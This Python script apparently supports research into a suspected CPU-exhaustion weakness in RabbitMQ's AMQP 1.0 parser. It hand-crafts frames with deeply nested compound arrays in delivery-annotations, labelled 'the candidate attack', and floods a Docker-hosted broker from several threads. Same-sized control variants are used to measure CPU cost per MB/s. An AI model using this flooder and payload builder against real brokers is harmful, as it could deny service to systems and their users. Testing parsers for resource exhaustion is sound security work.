#!/usr/bin/env python3
"""
Controlled 4-variant comparison for the RabbitMQ AMQP 1.0 compound-array hypothesis.

Variants (all same message size, same thread count, same duration):
  A: compound arrays in delivery-annotations  — the candidate attack
  B: same bytes in DATA body                  — body-skip control
  C: same-sized simple annotation map         — flat-annotation baseline
  D: nested list32(list32(...)) same size in delivery-annotations — recursion control

Reports CPU per MB/s for each variant so the CPU cost can be normalized against
input volume.  Also reads cgroup cpu.max to verify the Docker quota.
"""
import argparse, socket, struct, subprocess, sys, threading, time

# ── AMQP 1.0 encoding helpers ──────────────────────────────────────────────

_PROTO_SASL   = bytes([65, 77, 81, 80, 3, 1, 0, 0])
_PROTO_AMQP10 = bytes([65, 77, 81, 80, 0, 1, 0, 0])

def _uint(n):
    if n == 0: return bytes([0x43])
    if n < 256: return bytes([0x52, n])
    return bytes([0x70]) + struct.pack('!I', n)

def _ulong(n):
    if n == 0: return bytes([0x44])
    if n < 256: return bytes([0x53, n])
    return bytes([0x80]) + struct.pack('!Q', n)

def _sym8(s):
    b = s.encode(); return bytes([0xa3, len(b)]) + b

def _str8(s):
    b = s.encode(); return bytes([0xa1, len(b)]) + b

def _bool(v): return bytes([0x41]) if v else bytes([0x42])
def _null(): return bytes([0x40])

def _list32(items):
    body = b''.join(items)
    return bytes([0xd0]) + struct.pack('!II', len(body) + 4, len(items)) + body

def _map32(pairs):
    body = b''.join(k + v for k, v in pairs)
    count = len(pairs) * 2
    return bytes([0xd1]) + struct.pack('!II', len(body) + 4, count) + body

def _described(desc, val): return bytes([0x00]) + desc + val

def _amqp_frame(channel, body):
    return struct.pack('!IBBH', len(body) + 8, 2, 0, channel) + body

def _sasl_frame(body):
    return struct.pack('!IBBH', len(body) + 8, 2, 1, 0) + body

def _recv_exact(sock, n):
    buf = b''
    while len(buf) < n:
        c = sock.recv(n - len(buf))
        if not c: raise ConnectionError('eof')
        buf += c
    return buf

def _recv_frame(sock):
    hdr = _recv_exact(sock, 8)
    size, doff, ftype, ch = struct.unpack('!IBBH', hdr)
    body = _recv_exact(sock, size - 8)
    return ftype, ch, body[(doff - 2) * 4:]

def _connect(host, port, cid):
    s = socket.create_connection((host, port), timeout=10)
    s.settimeout(10)
    s.sendall(_PROTO_SASL)
    _recv_exact(s, 8)
    _recv_frame(s)
    sasl_init = _described(_ulong(0x41), _list32([_sym8('ANONYMOUS'), _null(), _null()]))
    s.sendall(_sasl_frame(sasl_init))
    _recv_frame(s)
    s.sendall(_PROTO_AMQP10)
    _recv_exact(s, 8)
    s.sendall(_amqp_frame(0, _described(_ulong(0x10), _list32([_str8(cid), _null(), _uint(131072)]))))
    _recv_frame(s)
    s.sendall(_amqp_frame(1, _described(_ulong(0x11), _list32([_null(), _uint(0), _uint(1000), _uint(1000)]))))
    _recv_frame(s)
    s.sendall(_amqp_frame(1, _described(_ulong(0x12),
        _list32([_str8(f"lnk-{cid}"), _uint(0), _bool(False), _null(), _null(), _null(), _null()]))))
    _recv_frame(s)
    return s

# ── Message builders ────────────────────────────────────────────────────────

def _compound_array(depth, width):
    """array32(array32(...(array8(ubyte)...))) — exercises parse_array2 recursion."""
    if depth == 0:
        n = width
        payload = bytes([n, 0x50]) + bytes(i % 256 for i in range(n))
        return bytes([0xe0, len(payload)]) + payload
    sub = _compound_array(depth - 1, width)
    ctor = sub[0]; sub_body = sub[1:]
    elements = sub_body * width
    payload = struct.pack('!I', width) + bytes([ctor]) + elements
    return bytes([0xf0]) + struct.pack('!I', len(payload)) + payload

def _nested_list(depth, width, _target_size=None):
    """list32(list32(...)) — exercises pm_compound but NOT parse_array2."""
    if depth == 0:
        # leaf: list32 of WIDTH ubytes
        body = b''.join(bytes([0x50, i % 256]) for i in range(width))
        return bytes([0xd0]) + struct.pack('!II', len(body) + 4, width) + body
    children = [_nested_list(depth - 1, width) for _ in range(width)]
    return _list32(children)

def _build_messages(depth=5, width=6):
    """Pre-build all 4 message variants and pad B, C, D to the same size as A."""
    ann_key = _sym8('a')
    # Variant A: compound arrays in delivery-annotations
    compound = _compound_array(depth, width)
    msg_a_payload = _described(_ulong(0x71), _map32([(ann_key, compound)])) \
                  + _described(_ulong(0x75), bytes([0xa0, 0x01, 0x00]))

    target_size = len(msg_a_payload)

    # Variant B: same compound array in DATA body (server_mode skips body parsing)
    data_body = _described(_ulong(0x75), compound)
    # Pad to target_size with extra data sections if needed
    b_base = data_body
    while len(b_base) < target_size - 4:
        b_base += _described(_ulong(0x75), bytes([0xa0, 0x01, 0x00]))
    msg_b_payload = b_base[:target_size] if len(b_base) > target_size else b_base

    # Variant C: same-sized simple annotation map (binary8 values, no recursion)
    # Fill the map value with binary8 blob of same size as compound array
    fill = max(0, len(compound) - 4)
    flat_val = bytes([0xb0]) + struct.pack('!I', fill) + (b'\xCC' * fill)
    msg_c_payload = _described(_ulong(0x71), _map32([(ann_key, flat_val)])) \
                  + _described(_ulong(0x75), bytes([0xa0, 0x01, 0x00]))

    # Variant D: nested list32(list32(...)) in delivery-annotations, same encoded size
    # Build with same depth/width then trim/pad to match
    nested = _nested_list(depth, width)
    # Pad to match compound array size with binary filler inside the annotation
    nl_fill = max(0, len(compound) - len(nested))
    if nl_fill > 0:
        # Wrap in a list that includes both the nested list and padding binary
        pad_bin = bytes([0xb0]) + struct.pack('!I', nl_fill) + (b'\xBB' * nl_fill)
        nested_padded = _list32([nested, pad_bin])
    else:
        nested_padded = nested
    msg_d_payload = _described(_ulong(0x71), _map32([(ann_key, nested_padded)])) \
                  + _described(_ulong(0x75), bytes([0xa0, 0x01, 0x00]))

    return {
        'A': msg_a_payload,
        'B': msg_b_payload,
        'C': msg_c_payload,
        'D': msg_d_payload,
    }

# ── CPU measurement via docker stats ───────────────────────────────────────

def _read_cpu_pct(container_id):
    """Read container CPU% from docker stats (non-streaming)."""
    try:
        r = subprocess.run(
            ['docker', 'stats', container_id, '--no-stream', '--no-trunc',
             '--format', '{{.CPUPerc}}'],
            capture_output=True, text=True, timeout=5,
        )
        s = r.stdout.strip().rstrip('%')
        return float(s) if s else None
    except Exception:
        return None

def _read_cgroup_quota(container_id):
    """Return (quota_us, period_us) from the container's cgroup cpu.max, or None."""
    try:
        r = subprocess.run(
            ['docker', 'exec', container_id, 'cat', '/sys/fs/cgroup/cpu.max'],
            capture_output=True, text=True, timeout=5,
        )
        parts = r.stdout.strip().split()
        if len(parts) == 2 and parts[0] != 'max':
            return int(parts[0]), int(parts[1])
    except Exception:
        pass
    return None

def _settle_cpu(container_id, target=15.0, timeout=120, label=''):
    """Wait until container CPU% drops below target."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        pct = _read_cpu_pct(container_id)
        if pct is not None and pct < target:
            return
        time.sleep(2)

# ── Variant runner ──────────────────────────────────────────────────────────

def _run_variant(host, port, container_id, msg_bytes, duration_s, threads, label):
    """
    Send msg_bytes for duration_s seconds across `threads` threads.
    Concurrently sample docker CPU.
    Returns (frames_sent, bytes_sent, cpu_samples, cpu_max).
    """
    frames = [0] * threads
    errors = [0] * threads
    stop_event = threading.Event()
    cpu_samples = []

    def worker(idx):
        end = time.monotonic() + duration_s
        while time.monotonic() < end and not stop_event.is_set():
            s = None
            try:
                cid = f"hg-{label}-{idx}-{int(time.monotonic() * 1000) % 1000000}"
                s = _connect(host, port, cid)
                s.settimeout(10)
                did = 0
                while time.monotonic() < end and not stop_event.is_set():
                    tag = struct.pack('!I', did)
                    xfer = _described(_ulong(0x14),
                        _list32([_uint(0), _uint(did), bytes([0xa0, len(tag)]) + tag,
                                 _null(), _bool(True)]))
                    s.sendall(_amqp_frame(1, xfer + msg_bytes))
                    did += 1
                    frames[idx] += 1
            except Exception:
                errors[idx] += 1
            finally:
                try:
                    if s: s.close()
                except Exception:
                    pass

    def cpu_sampler():
        while not stop_event.is_set():
            pct = _read_cpu_pct(container_id)
            if pct is not None:
                cpu_samples.append(pct)
            time.sleep(1)

    ts = [threading.Thread(target=worker, args=(i,), daemon=True) for i in range(threads)]
    cs = threading.Thread(target=cpu_sampler, daemon=True)

    cs.start()
    for t in ts: t.start()
    for t in ts: t.join()
    stop_event.set()
    cs.join(timeout=3)

    total_frames = sum(frames)
    total_bytes  = total_frames * len(msg_bytes)
    cpu_mean = sum(cpu_samples) / max(len(cpu_samples), 1) if cpu_samples else 0.0
    cpu_max  = max(cpu_samples) if cpu_samples else 0.0
    return total_frames, total_bytes, cpu_mean, cpu_max

# ── Main ────────────────────────────────────────────────────────────────────

def main():
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument('--host', default='localhost')
    p.add_argument('--port', type=int, default=5672)
    p.add_argument('--container-id', required=True)
    p.add_argument('--duration', type=int, default=30, help='seconds per variant')
    p.add_argument('--threads', type=int, default=5)
    p.add_argument('--depth', type=int, default=5)
    p.add_argument('--width', type=int, default=6)
    p.add_argument('--variants', default='ABCD',
                   help='Which variants to run, e.g. AC or ABCD')
    args = p.parse_args()

    msgs = _build_messages(args.depth, args.width)
    sizes = {k: len(v) for k, v in msgs.items()}
    print(f"\n=== AMQP 1.0 Compound-Array Controlled Comparison ===")
    print(f"depth={args.depth} width={args.width} threads={args.threads} duration={args.duration}s")
    print(f"Message sizes: { {k: f'{v:,} bytes (~{v//1024}KB)' for k,v in sizes.items()} }")

    # Verify cgroup quota
    quota = _read_cgroup_quota(args.container_id)
    if quota:
        q_us, p_us = quota
        effective_cpus = q_us / p_us
        print(f"cgroup cpu.max: {q_us}us / {p_us}us = {effective_cpus:.2f} effective CPUs")
    else:
        print("cgroup cpu.max: unable to read (cgroup v1 or not available)")

    # Measure baseline
    print(f"\nMeasuring baseline (10s)...")
    _settle_cpu(args.container_id, label='pre-baseline')
    baseline_samples = []
    for _ in range(10):
        pct = _read_cpu_pct(args.container_id)
        if pct is not None:
            baseline_samples.append(pct)
        time.sleep(1)
    baseline_cpu = sum(baseline_samples) / max(len(baseline_samples), 1)
    print(f"Baseline CPU: {baseline_cpu:.1f}%")

    variant_labels = {
        'A': 'compound arrays in delivery-annotations (CANDIDATE)',
        'B': 'compound arrays in DATA body (body-skip control)',
        'C': 'flat binary blob in delivery-annotations (flat-annotation control)',
        'D': 'nested list32(list32) in delivery-annotations (recursion control)',
    }

    results = {}
    for v in args.variants:
        if v not in msgs:
            print(f"Unknown variant {v}, skipping")
            continue
        print(f"\n--- Variant {v}: {variant_labels[v]} ---")
        print(f"  Settling CPU...", end='', flush=True)
        _settle_cpu(args.container_id, label=f'pre-{v}')
        print(f" done.")
        frames, total_bytes, cpu_mean, cpu_max = _run_variant(
            args.host, args.port, args.container_id,
            msgs[v], args.duration, args.threads, v
        )
        mb_total = total_bytes / (1024 * 1024)
        mbps     = mb_total / max(args.duration, 1)
        cpu_net  = cpu_mean - baseline_cpu
        cpu_per_mbps = cpu_net / mbps if mbps > 0 else 0.0
        results[v] = {
            'frames': frames,
            'fps': frames / max(args.duration, 1),
            'mbps': mbps,
            'cpu_mean': cpu_mean,
            'cpu_net': cpu_net,
            'cpu_max': cpu_max,
            'cpu_per_mbps': cpu_per_mbps,
        }
        print(f"  frames={frames:,}  fps={frames/max(args.duration,1):.0f}/s"
              f"  throughput={mbps:.1f} MB/s")
        print(f"  cpu_mean={cpu_mean:.1f}%  cpu_net={cpu_net:+.1f}pp"
              f"  cpu_max={cpu_max:.1f}%")
        print(f"  >>> cpu_per_MB/s: {cpu_per_mbps:.3f} pp/(MB/s)")

    # Summary table
    if results:
        print(f"\n{'='*72}")
        print(f"{'Variant':<8} {'MB/s':>8} {'CPU net':>10} {'pp/(MB/s)':>12}  Label")
        print(f"{'-'*72}")
        for v, r in results.items():
            print(f"  {v}      {r['mbps']:>7.1f}  {r['cpu_net']:>+9.1f}pp"
                  f"  {r['cpu_per_mbps']:>10.3f}    {variant_labels[v][:40]}")
        print(f"{'='*72}")

        if 'A' in results and 'C' in results:
            ratio = results['A']['cpu_per_mbps'] / max(results['C']['cpu_per_mbps'], 0.001)
            print(f"\nA/C cpu_per_mbps ratio: {ratio:.2f}x  "
                  f"(>2.0x would support a parser-overhead finding)")
        if 'A' in results and 'D' in results:
            ratio = results['A']['cpu_per_mbps'] / max(results['D']['cpu_per_mbps'], 0.001)
            print(f"A/D cpu_per_mbps ratio: {ratio:.2f}x  "
                  f"(>2.0x would support array vs list parsing cost difference)")

if __name__ == '__main__':
    main()
